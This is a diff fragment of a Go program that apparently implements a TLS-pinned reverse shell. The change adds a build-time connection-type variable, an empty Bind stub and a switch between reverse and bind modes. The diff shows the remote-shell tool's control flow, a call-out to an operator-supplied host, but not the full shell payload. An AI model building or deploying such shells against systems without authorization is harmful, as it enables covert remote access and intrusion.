@@ -20,6 +20,7 @@ const (
 var (
 	connectString string
 	fingerPrint   string
+	connType      string
 )
 
 func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
@@ -65,13 +66,23 @@ func Reverse(connectString string, fingerprint []byte) {
 	cmd.Run()
 }
 
+func Bind(addr string) {
+}
+
 func main() {
-	if connectString != "" && fingerPrint != "" {
+	if connectString != "" && fingerPrint != "" && connType != "" {
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
 		if err != nil {
 			os.Exit(ERR_COULD_NOT_DECODE)
 		}
-		Reverse(connectString, bytesFingerprint)
+		switch connType {
+		case "reverse":
+			Reverse(connectString, bytesFingerprint)
+		case "bind":
+			Bind(connectString)
+		default:
+			Reverse(connectString, bytesFingerprint)
+		}
 	}
 }
